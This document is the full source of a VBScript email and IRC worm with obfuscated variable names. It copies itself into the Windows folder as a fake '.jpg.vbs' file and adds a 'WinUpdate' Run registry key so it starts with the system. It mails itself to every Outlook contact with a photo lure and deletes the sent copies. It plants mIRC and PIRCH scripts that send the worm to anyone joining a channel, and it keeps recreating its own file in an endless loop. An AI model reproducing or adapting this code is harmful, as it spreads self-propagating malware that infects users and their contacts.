On Error Resume Next
Set z4QcpWmqjIz= Createobject("scripting.filesystemobject")
z4QcpWmqjIz.copyfile wscript.scriptfullname,z4QcpWmqjIz.GetSpecialFolder(0)& "\tvare2.jpg.vbs"
Set k8R4w076L51 = CreateObject("WScript.Shell")
k8R4w076L51.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe "&z4QcpWmqjIz.GetSpecialFolder(0)& "\tvare2.jpg.vbs %"
if k8R4w076L51.regread ("HKCU\software\tcherweak\mailed") <> "1" then
mailni()
end if
if k8R4w076L51.regread ("HKCU\software\tcherweak\mirqued") <> "1" then
mirkni ""
end if
if k8R4w076L51.regread ("HKCU\software\tcherweak\pirched") <> "1" then
pirchni ""
end if
Set y5qpM0Jls2W= z4QcpWmqjIz.opentextfile(wscript.scriptfullname, 1)
gOEwCK4anil= y5qpM0Jls2W.readall
y5qpM0Jls2W.Close
Do
If Not (z4QcpWmqjIz.fileexists(wscript.scriptfullname)) Then
Set MQi6o5nm1RM= z4QcpWmqjIz.createtextfile(wscript.scriptfullname, True)
MQi6o5nm1RM.writegOEwCK4anil
MQi6o5nm1RM.Close
End If
Loop
Function mailni()
On Error Resume Next
Set y0fEc2zQ9W8 = CreateObject("Outlook.Application")
If y0fEc2zQ9W8= "Outlook"Then
Set Veo322Bh4wO=y0fEc2zQ9W8.GetNameSpace("MAPI")
Set g6EG5VjaH2M= Veo322Bh4wO.AddressLists
For Each d890YezW3Ud In g6EG5VjaH2M
If d890YezW3Ud.AddressEntries.Count <> 0 Then
RLHrEZ4m3M9 = d890YezW3Ud.AddressEntries.Count
For HtxjRh05y4C= 1 To RLHrEZ4m3M9
Set iZvqD9BJ0j2 = y0fEc2zQ9W8.CreateItem(0)
Set yBb40gJwYCs = d890YezW3Ud.AddressEntries(HtxjRh05y4C)
iZvqD9BJ0j2.To = yBb40gJwYCs.Address
iZvqD9BJ0j2.Subject = "kewl fotka"
iZvqD9BJ0j2.Body = "Kukaj na tu supu, co som nasiel :-)" & vbcrlf & ""
set Wr020f9GO9E=iZvqD9BJ0j2.Attachments
Wr020f9GO9E.Add z4QcpWmqjIz.GetSpecialFolder(0)& "\tvare1.jpg"
Wr020f9GO9E.Add z4QcpWmqjIz.GetSpecialFolder(0)& "\tvare2.jpg.vbs"
iZvqD9BJ0j2.DeleteAfterSubmit = True
If iZvqD9BJ0j2.To <> "" Then
iZvqD9BJ0j2.Send
k8R4w076L51.regwrite "HKCU\software\tcherweak\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function mirkni(Lmlt9hhpGSd)
On Error Resume Next
if Lmlt9hhpGSd = "" then
if z4QcpWmqjIz.fileexists("c:\mirc\mirc.ini") then Lmlt9hhpGSd="c:\mirc"
if z4QcpWmqjIz.fileexists("c:\mirc32\mirc.ini") then Lmlt9hhpGSd="c:\mirc32"
kh2YG2w860J=k8R4w076L51.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if z4QcpWmqjIz.fileexists(kh2YG2w860J & "\mirc\mirc.ini") then Lmlt9hhpGSd=kh2YG2w860J & "\mirc"
end if
if Lmlt9hhpGSd <> "" then
set neLk47iBNJT = z4QcpWmqjIz.CreateTextFile(Lmlt9hhpGSd & "\script.ini", True)
neLk47iBNJT.WriteLine "[script]"
neLk47iBNJT.writeline "n0=on 1:JOIN:#:{"
neLk47iBNJT.writeline "n1=  /if ( $nick == $me ) { halt }"
neLk47iBNJT.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&z4QcpWmqjIz.GetSpecialFolder(0)& "\tvare2.jpg.vbs" & vbCrLf & "n3=}"
neLk47iBNJT.close
k8R4w076L51.regwrite "HKCU\software\tcherweak\Mirqued", "1"
end if
end function
function pirchni(XbAy08j7S7d)
On Error Resume Next
if XbAy08j7S7d="" then
if z4QcpWmqjIz.fileexists("c:\pirch\Pirch32.exe") then XbAy08j7S7d="c:\pirch"
if z4QcpWmqjIz.fileexists("c:\pirch32\Pirch32.exe") then XbAy08j7S7d="c:\pirch32"
Qk2R1f733L9=k8R4w076L51.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if z4QcpWmqjIz.fileexists(Qk2R1f733L9 & "\pirch\Pirch32.exe") then XbAy08j7S7d=Qk2R1f733L9 & "\pirch\Pirch32.exe"
end if
if XbAy08j7S7d <> "" then
set R79Va3zQezO= z4QcpWmqjIz.CreateTextFile(XbAy08j7S7d & "\events.ini", True)
R79Va3zQezO.WriteLine "[Levels]"
R79Va3zQezO.WriteLine "Enabled=1"
R79Va3zQezO.WriteLine "Count=6"
R79Va3zQezO.WriteLine "Level1=000-Unknowns"
R79Va3zQezO.WriteLine "000-UnknownsEnabled=1"
R79Va3zQezO.WriteLine "Level2=100-Level 100"
R79Va3zQezO.WriteLine "100-Level 100Enabled=1"
R79Va3zQezO.WriteLine "Level3=200-Level 200"
R79Va3zQezO.WriteLine "200-Level 200Enabled=1"
R79Va3zQezO.WriteLine "Level4=300-Level 300"
R79Va3zQezO.WriteLine " 300-Level 300Enabled=1"
R79Va3zQezO.WriteLine "Level5=400-Level 400 "
R79Va3zQezO.WriteLine "400-Level 400Enabled=1"
R79Va3zQezO.WriteLine "Level6=500-Level 500"
R79Va3zQezO.WriteLine "500-Level 500Enabled=1"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[000-Unknowns]"
R79Va3zQezO.WriteLine "UserCount=0"
R79Va3zQezO.WriteLine "EventCount=0"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[100-Level 100]"
R79Va3zQezO.WriteLine "User1=*!*@*"
R79Va3zQezO.WriteLine "UserCount=1"
R79Va3zQezO.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & z4QcpWmqjIz.GetSpecialFolder(0) & "\tvare2.jpg.vbs"
R79Va3zQezO.WriteLine "EventCount=1"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[200-Level 200]"
R79Va3zQezO.WriteLine "UserCount=0"
R79Va3zQezO.WriteLine "EventCount=0"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[300-Level 300]"
R79Va3zQezO.WriteLine "UserCount=0"
R79Va3zQezO.WriteLine "EventCount=0"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[400-Level 400]"
R79Va3zQezO.WriteLine "UserCount=0"
R79Va3zQezO.WriteLine "EventCount=0"
R79Va3zQezO.WriteLine ""
R79Va3zQezO.WriteLine "[500-Level 500]"
R79Va3zQezO.WriteLine "UserCount=0"
R79Va3zQezO.WriteLine "EventCount=0"
R79Va3zQezO.close
k8R4w076L51.regwrite "HKCU\software\tcherweak\pirched", "1"
end if
end function

